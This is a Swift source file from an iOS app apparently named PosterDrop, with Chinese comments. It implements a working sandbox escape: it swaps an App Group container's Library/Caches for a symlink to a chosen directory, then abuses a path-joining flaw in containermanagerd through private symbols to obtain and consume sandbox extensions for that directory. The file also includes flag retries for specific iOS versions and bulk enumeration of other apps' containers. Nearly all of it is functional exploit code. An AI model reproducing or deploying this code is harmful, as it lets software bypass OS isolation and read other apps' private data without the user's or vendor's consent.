//
//  SandboxEscape.swift
//  PosterDrop
//
//  直连通道的底层：借 containermanagerd 的路径拼接缺陷，拿到任意容器目录的沙箱扩展。
//
//  参考（非拷贝）：worse_query / WQFiles / filza-wq 的公开实现，关键点有三处——
//    1. 查询必须用 **App Group 容器**（class 7）+ `container_query_set_group_identifiers`，
//       所以签名里必须带 com.apple.security.application-groups，否则拿不到结果；
//    2. 交换点是 `<group>/Library/Caches`：先把它换成指向目标的符号链接，再查 part=3；
//       守护进程拼出的路径没有 realpath 校验，签出来的扩展就落在目标上；
//    3. iOS 26 与 27 要求的 flags 不同（0x0000008000000000 / 0x0000000800000000），
//       而且“签发成功”不等于“真的能打开”，必须逐个路径验证后换另一组 flags 重试。
//
//  与 WQFiles 一致：Token 按路径缓存并限量，超出后释放最旧的；交换过程留恢复标记，
//  即使进程被杀，下次启动也能把 Caches 还原，不会让容器永久坏掉。
//

import Foundation
import CoreFoundation
import Darwin

/// 一次已持有的沙箱扩展。释放由 SandboxEscape 统一管理。
final class EscapeSession: @unchecked Sendable {

    let target: String
    let group: String
    let handle: Int64

    init(target: String, group: String, handle: Int64) {
        self.target = target
        self.group = group
        self.handle = handle
    }

    var label: String { "App Group（\(group)）" }
}

enum SandboxEscape {

    struct Failure: LocalizedError {
        let code: Int64
        let message: String
        var errorDescription: String? { "\(message)（代码 \(code)）" }
    }

    // MARK: - 签名里的 App Group

    /// 从自身签名读取 com.apple.security.application-groups。
    /// 用签名里的名字而不是写死，重签时换成任何 profile 允许的 group 都能工作。
    static func entitledGroups() -> [String] {
        guard let security = dlopen("/System/Library/Frameworks/Security.framework/Security", RTLD_NOW) else {
            return []
        }
        defer { dlclose(security) }

        typealias CreateFromSelf = @convention(c) (CFAllocator?) -> UnsafeMutableRawPointer?
        typealias CopyValue = @convention(c) (UnsafeMutableRawPointer?, CFString, UnsafeMutableRawPointer?) -> UnsafeMutableRawPointer?

        guard let createPtr = dlsym(security, "SecTaskCreateFromSelf"),
              let copyPtr = dlsym(security, "SecTaskCopyValueForEntitlement") else {
            return []
        }
        let create = unsafeBitCast(createPtr, to: CreateFromSelf.self)
        let copyValue = unsafeBitCast(copyPtr, to: CopyValue.self)

        guard let task = create(kCFAllocatorDefault) else { return [] }
        defer { Unmanaged<AnyObject>.fromOpaque(task).release() }

        guard let value = copyValue(task, "com.apple.security.application-groups" as CFString, nil) else {
            return []
        }
        let object = Unmanaged<AnyObject>.fromOpaque(value).takeRetainedValue()
        return (object as? [String]) ?? []
    }

    /// 选一个容器真实存在的 group：优先用户填的，其次签名里的第一个可用项。
    static func usableGroup(preferred: String? = nil) -> String? {
        let fileManager = FileManager.default
        let candidates = entitledGroups()

        if let preferred, !preferred.isEmpty,
           fileManager.containerURL(forSecurityApplicationGroupIdentifier: preferred) != nil {
            return preferred
        }
        for group in candidates where fileManager.containerURL(forSecurityApplicationGroupIdentifier: group) != nil {
            return group
        }
        return nil
    }

    static func groupContainerPath(_ group: String) -> String? {
        FileManager.default.containerURL(forSecurityApplicationGroupIdentifier: group)?.path
    }

    // MARK: - 扩展缓存

    private static let lock = NSLock()
    private static var grants: [String: EscapeSession] = [:]
    private static var grantOrder: [String] = []
    private static let maxGrants = 48

    private static func cached(_ key: String) -> EscapeSession? {
        lock.lock()
        defer { lock.unlock() }
        guard let session = grants[key] else { return nil }
        grantOrder.removeAll { $0 == key }
        grantOrder.append(key)
        return session
    }

    private static func remember(_ session: EscapeSession, key: String) {
        lock.lock()
        defer { lock.unlock() }
        while grantOrder.count >= maxGrants, let oldest = grantOrder.first {
            if let victim = grants.removeValue(forKey: oldest) {
                release(victim.handle)
            }
            grantOrder.removeFirst()
        }
        grants[key] = session
        grantOrder.removeAll { $0 == key }
        grantOrder.append(key)
    }

    static func release(_ handle: Int64) {
        guard handle >= 0 else { return }
        guard let pointer = dlsym(UnsafeMutableRawPointer(bitPattern: -2), "sandbox_extension_release") else { return }
        typealias Release = @convention(c) (Int64) -> Void
        let releaseHandle = unsafeBitCast(pointer, to: Release.self)
        _ = releaseHandle(handle)
    }

    // MARK: - 申请

    static func grant(path: String, group: String) throws -> EscapeSession {
        let canonical = canonicalPath(path)
        if let hit = cached(canonical) { return hit }

        var status = stat()
        guard lstat(canonical, &status) == 0 else {
            throw Failure(code: -255, message: "目标不存在：\(canonical)")
        }
        guard (status.st_mode & S_IFMT) == S_IFDIR else {
            throw Failure(code: -255, message: "目标不是目录：\(canonical)")
        }

        guard let base = groupContainerPath(group) else {
            throw Failure(code: -1, message: "App Group 容器不存在，签名里缺少 \(group) 的 entitlement")
        }

        let iosMajor = ProcessInfo.processInfo.operatingSystemVersion.majorVersion
        // WQFiles 的实测：iOS 27 用标准 flags，iOS 26 用备用 flags
        let primary: UInt64 = iosMajor >= 27 ? 0x0000_0080_0000_0000 : 0x0000_0008_0000_0000
        let secondary: UInt64 = iosMajor >= 27 ? 0x0000_0008_0000_0000 : 0x0000_0080_0000_0000

        var lastCode: Int64 = -5
        for flags in [primary, secondary] {
            let handle: Int64
            do {
                // 每次尝试都重新交换一遍：一次交换只服务一次查询，失败也能干净还原。
                let swap = try CacheSwap(library: base + "/Library", target: canonical)
                defer { swap.finish() }
                handle = try queryToken(group: group, flags: flags)
            } catch let failure as Failure {
                lastCode = failure.code
                continue
            }

            if opens(canonical) {
                let session = EscapeSession(target: canonical, group: group, handle: handle)
                remember(session, key: canonical)
                return session
            }

            // 签发并 consume 都成功，却打不开目标：换另一组 flags 重来
            release(handle)
            lastCode = -8
        }

        throw Failure(code: lastCode, message: describe(lastCode))
    }

    /// 给一个还不存在的路径申请扩展：沿父目录向上找第一个存在且可授权的位置。
    static func grantNearestExisting(path: String, group: String) -> EscapeSession? {
        var current = canonicalPath(path)
        while current != "/" && current != "." {
            if let session = try? grant(path: current, group: group) {
                return session
            }
            current = (current as NSString).deletingLastPathComponent
        }
        return nil
    }

    // MARK: - 查询与交换

    private typealias QueryCreate = @convention(c) () -> UnsafeMutableRawPointer?
    private typealias QuerySetClass = @convention(c) (UnsafeMutableRawPointer?, UInt64) -> Void
    private typealias QuerySetIDs = @convention(c) (UnsafeMutableRawPointer?, UnsafeMutableRawPointer?) -> Void
    private typealias QuerySetFlags = @convention(c) (UnsafeMutableRawPointer?, UInt64) -> Void
    private typealias QuerySetPart = @convention(c) (UnsafeMutableRawPointer?, UInt64) -> Void
    private typealias QueryGetSingle = @convention(c) (UnsafeMutableRawPointer?) -> UnsafeMutableRawPointer?
    private typealias QueryFree = @convention(c) (UnsafeMutableRawPointer?) -> Void
    private typealias CopyToken = @convention(c) (UnsafeMutableRawPointer?) -> UnsafeMutablePointer<CChar>?
    private typealias XPCStringCreate = @convention(c) (UnsafePointer<CChar>?) -> UnsafeMutableRawPointer?
    private typealias Consume = @convention(c) (UnsafePointer<CChar>?) -> Int64

    private static let containerClassAppGroup: UInt64 = 7
    private static let partCaches: UInt64 = 3

    /// 发一次查询并 consume 拿到的 token。
    /// 前置条件：`<group>/Library/Caches` 此刻已是指向目标路径的符号链接。
    private static func queryToken(group: String, flags: UInt64) throws -> Int64 {
        guard let manager = dlopen("/usr/lib/system/libsystem_containermanager.dylib", RTLD_NOW | RTLD_LOCAL) else {
            throw Failure(code: -2, message: "无法加载 libsystem_containermanager")
        }
        defer { dlclose(manager) }

        guard let xpcLib = dlopen("/usr/lib/system/libxpc.dylib", RTLD_NOW) else {
            throw Failure(code: -2, message: "无法加载 libxpc")
        }
        defer { dlclose(xpcLib) }

        func symbol<T>(_ name: String, in handle: UnsafeMutableRawPointer, as type: T.Type) -> T? {
            guard let pointer = dlsym(handle, name) else { return nil }
            return unsafeBitCast(pointer, to: type)
        }

        guard let create = symbol("container_query_create", in: manager, as: QueryCreate.self),
              let setClass = symbol("container_query_set_class", in: manager, as: QuerySetClass.self),
              let setGroups = symbol("container_query_set_group_identifiers", in: manager, as: QuerySetIDs.self),
              let setPart = symbol("container_query_operation_set_part", in: manager, as: QuerySetPart.self),
              let setFlags = symbol("container_query_operation_set_flags", in: manager, as: QuerySetFlags.self),
              let single = symbol("container_query_get_single_result", in: manager, as: QueryGetSingle.self),
              let freeQuery = symbol("container_query_free", in: manager, as: QueryFree.self),
              let copyToken = symbol("container_copy_sandbox_token", in: manager, as: CopyToken.self),
              let xpcString = symbol("xpc_string_create", in: xpcLib, as: XPCStringCreate.self)
        else {
            throw Failure(code: -2, message: "系统缺少容器查询符号，可能已被修补")
        }

        guard let consumePointer = dlsym(UnsafeMutableRawPointer(bitPattern: -2), "sandbox_extension_consume") else {
            throw Failure(code: -2, message: "系统缺少 sandbox_extension_consume")
        }
        let consume = unsafeBitCast(consumePointer, to: Consume.self)

        guard let query = create() else {
            throw Failure(code: -3, message: "创建容器查询失败")
        }
        defer { freeQuery(query) }

        setClass(query, containerClassAppGroup)
        setGroups(query, xpcString(group))
        setPart(query, partCaches)
        setFlags(query, flags)

        guard let result = single(query) else {
            throw Failure(code: -5, message: "containermanagerd 拒绝了这次查询")
        }
        guard let token = copyToken(result) else {
            throw Failure(code: -6, message: "内核拒绝签发沙箱扩展")
        }
        defer { free(token) }

        let handle = consume(token)
        guard handle >= 0 else {
            throw Failure(code: handle, message: describe(handle))
        }
        return handle
    }

    private static func opens(_ path: String) -> Bool {
        let fd = open(path, O_RDONLY | O_DIRECTORY | O_NOFOLLOW | O_CLOEXEC)
        if fd >= 0 {
            close(fd)
            return true
        }
        // EACCES 是普通权限问题（root 拥有的目录），换 flags 也解决不了，
        // 但至少说明沙箱已经放行；EPERM 才是扩展没生效。
        return errno != EPERM
    }

    private static func canonicalPath(_ path: String) -> String {
        var resolved = (path as NSString).standardizingPath
        if resolved.hasPrefix("/var/") {
            resolved = "/private" + resolved
        }
        return resolved
    }

    private static func describe(_ code: Int64) -> String {
        switch code {
        case -1: return "App Group 容器不存在（签名里缺少 App Groups 权限，或 group 名字不匹配）"
        case -2: return "系统缺少所需符号，可能已修补"
        case -3: return "创建查询失败"
        case -4: return "无法交换 Library/Caches"
        case -5: return "containermanagerd 拒绝了这次查询"
        case -6: return "内核拒绝签发沙箱扩展"
        case -7: return "扩展已签发但无法 consume"
        case -8: return "扩展已签发，但目标仍无法打开（flags 不匹配或系统已修补）"
        case -255: return "目标路径无效"
        default: return "未知错误"
        }
    }

    // MARK: - Caches 交换（可恢复）

    /// 把 `<group>/Library/Caches` 换成指向目标的符号链接，结束后原样还原。
    /// 交换前先写恢复标记：进程若中途被杀，下次启动 recover() 会把 Caches 换回来。
    final class CacheSwap {

        private let library: String
        private let target: String
        private let backupName = "Caches.posterdrop-backup"
        private let markerName = ".posterdrop-swap.plist"
        private let lockFD: Int32
        private var active = false

        init(library: String, target: String) throws {
            self.library = library
            self.target = target

            try FileManager.default.createDirectory(atPath: library, withIntermediateDirectories: true)

            let lockPath = library + "/.posterdrop-swap.lock"
            lockFD = open(lockPath, O_CREAT | O_RDWR, 0o600)
            guard lockFD >= 0 else {
                throw Failure(code: -4, message: "无法创建交换锁：\(library)")
            }
            guard flock(lockFD, LOCK_EX | LOCK_NB) == 0 else {
                close(lockFD)
                throw Failure(code: -4, message: "另一个交换正在进行")
            }

            // 上一次异常退出留下的现场，先恢复
            CacheSwap.recover(library: library)

            let caches = library + "/Caches"
            let backup = library + "/" + backupName
            let fileManager = FileManager.default

            var isDirectory: ObjCBool = false
            if fileManager.fileExists(atPath: caches, isDirectory: &isDirectory) {
                if isDirectory.boolValue {
                    try? fileManager.removeItem(atPath: backup)
                    do {
                        try fileManager.moveItem(atPath: caches, toPath: backup)
                    } catch {
                        close(lockFD)
                        throw Failure(code: -4, message: "无法移走原 Caches：\(error.localizedDescription)")
                    }
                } else {
                    try? fileManager.removeItem(atPath: caches)
                }
            }

            try writeMarker()
            do {
                try fileManager.createSymbolicLink(atPath: caches, withDestinationPath: target)
            } catch {
                _ = try? fileManager.moveItem(atPath: backup, toPath: caches)
                try? fileManager.removeItem(atPath: library + "/" + markerName)
                close(lockFD)
                throw Failure(code: -4, message: "无法创建符号链接：\(error.localizedDescription)")
            }
            active = true
        }

        /// 把符号链接改指另一个目标：批量签发时省掉「移走 / 移回 Caches」的开销。
        /// 备份目录与恢复标记保持不动，中途被杀仍能由 recover() 还原。
        func retarget(to newTarget: String) throws {
            let caches = library + "/Caches"
            try? FileManager.default.removeItem(atPath: caches)
            do {
                try FileManager.default.createSymbolicLink(atPath: caches, withDestinationPath: newTarget)
            } catch {
                throw Failure(code: -4, message: "无法重建符号链接：\(error.localizedDescription)")
            }
        }

        func finish() {
            guard active else {
                close(lockFD)
                return
            }
            CacheSwap.recover(library: library)
            close(lockFD)
            active = false
        }

        private func writeMarker() throws {
            let marker: [String: String] = ["target": target, "backup": backupName]
            let data = try PropertyListSerialization.data(fromPropertyList: marker, format: .xml, options: 0)
            try data.write(to: URL(fileURLWithPath: library + "/" + markerName), options: .atomic)
        }

        /// 还原：删掉符号链接，把备份目录换回来。可重复调用。
        static func recover(library: String) {
            let fileManager = FileManager.default
            let markerPath = library + "/" + ".posterdrop-swap.plist"
            let backup = library + "/Caches.posterdrop-backup"
            let caches = library + "/Caches"

            guard let data = try? Data(contentsOf: URL(fileURLWithPath: markerPath)),
                  let plist = try? PropertyListSerialization.propertyList(from: data, options: [], format: nil),
                  let dict = plist as? [String: String] else {
                // 没有标记但仍可能有残留备份
                if fileManager.fileExists(atPath: backup), !fileManager.fileExists(atPath: caches) {
                    try? fileManager.moveItem(atPath: backup, toPath: caches)
                }
                return
            }

            var status = stat()
            let isLink = lstat(caches, &status) == 0 && (status.st_mode & S_IFMT) == S_IFLNK
            if isLink {
                // 只有符号链接是这次交换留下的，删它是安全的
                try? fileManager.removeItem(atPath: caches)
            }

            if fileManager.fileExists(atPath: backup) {
                if !fileManager.fileExists(atPath: caches) {
                    try? fileManager.moveItem(atPath: backup, toPath: caches)
                }
                // Caches 已经是真实目录：说明已恢复过，备份留着不影响使用
            } else if !fileManager.fileExists(atPath: caches) {
                try? fileManager.createDirectory(atPath: caches, withIntermediateDirectories: false)
            }

            try? fileManager.removeItem(atPath: markerPath)
            _ = dict
        }
    }

    // MARK: - 批量签发（枚举容器时用）

    /// 一次交换里给很多路径签发扩展。
    ///
    /// 枚举容器时每个候选都要一次 token；如果每个都完整交换一次 Caches，
    /// 几百个容器要好几秒。这里只保留一份备份，之后仅重指符号链接。
    /// 用完必须 `finish()`，否则 Caches 会一直指着最后一个目标（有恢复标记兜底）。
    final class Sweeper {

        private let group: String
        private let swap: CacheSwap
        private var finished = false

        init?(group: String) {
            guard let base = SandboxEscape.groupContainerPath(group),
                  let swap = try? CacheSwap(library: base + "/Library", target: "/") else {
                return nil
            }
            self.group = group
            self.swap = swap
        }

        /// 全新签发一个 handle；调用方负责 release。失败返回 nil，不抛错。
        func grant(_ path: String) -> Int64? {
            let canonical = SandboxEscape.canonicalPath(path)
            let major = ProcessInfo.processInfo.operatingSystemVersion.majorVersion
            let candidates: [UInt64] = major >= 27
                ? [0x0000_0080_0000_0000, 0x0000_0008_0000_0000]
                : [0x0000_0008_0000_0000, 0x0000_0080_0000_0000]

            for flags in candidates {
                guard (try? swap.retarget(to: canonical)) != nil else { return nil }
                guard let handle = try? SandboxEscape.queryToken(group: group, flags: flags) else { continue }
                if SandboxEscape.opens(canonical) {
                    return handle
                }
                SandboxEscape.release(handle)
            }
            return nil
        }

        /// 读容器根目录的扩展属性，值就是这个容器所属 App 的 bundle id。
        /// 比“读目录里有没有某个子目录”快得多，也不受数据保护影响。
        func identifier(of path: String) -> String? {
            guard let handle = grant(path) else { return nil }
            defer { SandboxEscape.release(handle) }
            return SandboxEscape.containerIdentifier(at: path)
        }

        /// 是否能在这个路径下看到指定相对路径（用于最终确认 PRBPosterExtensionDataStore）。
        func contains(_ path: String, relative: String) -> Bool {
            guard let handle = grant(path) else { return false }
            defer { SandboxEscape.release(handle) }
            var status = stat()
            return stat(path + "/" + relative, &status) == 0
        }

        func finish() {
            guard !finished else { return }
            finished = true
            swap.finish()
        }

        deinit { finish() }
    }

    /// 容器的扩展属性 com.apple.containermanager.identifier，值形如 com.apple.PosterBoard。
    static func containerIdentifier(at path: String) -> String? {
        var buffer = [CChar](repeating: 0, count: 1024)
        let length = getxattr(path, "com.apple.containermanager.identifier", &buffer, buffer.count - 1, 0, 0)
        guard length > 0 else { return nil }
        let value = String(cString: buffer)
        return value.isEmpty ? nil : value
    }

    /// 启动时调用：把上次异常中断的交换恢复掉。
    static func recoverPendingSwaps() {
        for group in entitledGroups() {
            guard let base = groupContainerPath(group) else { continue }
            CacheSwap.recover(library: base + "/Library")
        }
    }
}
